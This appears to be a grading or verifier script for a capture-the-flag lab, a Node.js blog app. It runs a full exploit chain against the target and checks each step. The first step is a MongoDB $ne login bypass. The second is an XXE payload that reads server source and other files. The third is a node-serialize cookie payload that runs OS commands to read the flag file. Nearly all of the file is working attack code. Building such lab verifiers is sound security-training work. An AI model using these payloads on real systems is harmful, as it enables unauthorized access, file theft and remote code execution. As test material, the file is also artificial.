#!/usr/bin/env python3
"""Independent player verifier: no Docker socket, filesystem, or target exec."""
import html
import http.cookiejar
import json
import os
import re
import urllib.error
import urllib.parse
import urllib.request

BASE = os.environ.get("TARGET_URL", "http://nodeblog-target:5000").rstrip("/")
EXPECTED = os.environ["EXPECTED_USER_FLAG"]
assert re.fullmatch(r"TTP\{[a-zA-Z0-9_]+\}", EXPECTED)

jar = http.cookiejar.CookieJar()
player = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
untrusted = urllib.request.build_opener()

def send(path, data=None, headers=None, opener=player):
    req = urllib.request.Request(BASE + path, data=data, headers=headers or {})
    with opener.open(req, timeout=20) as resp:
        return resp.status, resp.read().decode("utf-8", "replace")

def post_json(path, value):
    return send(path, json.dumps(value).encode(), {"Content-Type": "application/json"})

def post_form(path, value):
    return send(path, urllib.parse.urlencode(value).encode(),
                {"Content-Type": "application/x-www-form-urlencoded"})

def upload_xml(xml):
    boundary = "nodeblog-real-xxe"
    data = (
        "--" + boundary + "\r\n"
        'Content-Disposition: form-data; name="file"; filename="post.xml"\r\n'
        "Content-Type: application/xml\r\n\r\n" +
        xml + "\r\n--" + boundary + "--\r\n"
    ).encode()
    return send("/articles/xml", data,
                {"Content-Type": "multipart/form-data; boundary=" + boundary})

def xxe_file(path):
    xml = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE post [<!ENTITY xxe SYSTEM "file://' + path + '">]>'
        '<post><title>Note</title><description>&xxe;</description>'
        '<markdown>Draft</markdown></post>'
    )
    status, text = upload_xml(xml)
    assert status == 200 and "Invalid XML Example" not in text, "Native XXE failed"
    return html.unescape(text)

def execute_cookie(command):
    js = "_$$ND_FUNC$$_function(){require('child_process').execSync(" + json.dumps(command) + ");}()"
    obj = json.dumps({"rce": js}, separators=(",", ":"))
    header = {"Cookie": "auth=" + urllib.parse.quote(obj, safe="")}
    status, body = send("/", headers=header, opener=untrusted)
    assert status == 200 and "Blog Articles" in body

print("[1/9] Public article listing")
_, home = send("/")
assert "Blog Articles" in home and "UHC Qualifiers" in home
assert "New Article" not in home

print("[2/9] Ordinary bad login distinguishes user and password")
_, body = post_form("/login", {"user": "unknown", "password": "wrong"})
assert "Invalid Username" in body
_, body = post_form("/login", {"user": "admin", "password": "wrong"})
assert "Invalid Password" in body

print("[3/9] URL-encoded bracket input cannot create Mongo operator")
_, body = post_form("/login", {"user": "admin", "password[$ne]": "wrong"})
assert "Invalid Password" in body or "Invalid Username" in body

print("[4/9] Real MongoDB operator auth bypass")
_, home = post_json("/login", {"user": "admin", "password": {"$ne": "wrong"}})
assert "New Article" in home and "Upload" in home
assert any(c.name == "auth" for c in jar)

print("[5/9] Legitimate XML import populates article editor")
_, editor = upload_xml("<post><title>Demo</title><description>Alpha</description><markdown>Beta</markdown></post>")
assert "New Article" in editor and "Alpha" in editor and "Beta" in editor

print("[6/9] XXE discloses real application server source")
source = xxe_file("/opt/blog/server.js")
assert "require('node-serialize')" in source
assert "serialize.unserialize" in source and "cookie_secret" in source

print("[7/9] node-serialize IIFE executes OS command")
execute_cookie("id > /tmp/nodeblog-rce-proof")
assert "uid=10001(nodeblog)" in xxe_file("/tmp/nodeblog-rce-proof")

print("[8/9] Web foothold extracts per-instance goal flag")
execute_cookie("cat /home/nodeblog/user.txt > /tmp/nodeblog-flag-proof")
assert EXPECTED in xxe_file("/tmp/nodeblog-flag-proof")

print("[9/9] Flag is not a public static route")
try:
    send("/user.txt")
    raise AssertionError("Flag leaked over static HTTP")
except urllib.error.HTTPError as err:
    assert err.code == 404

print("PASS: MongoDB NoSQLi -> real libxml2 XXE -> node-serialize RCE -> Web flag")
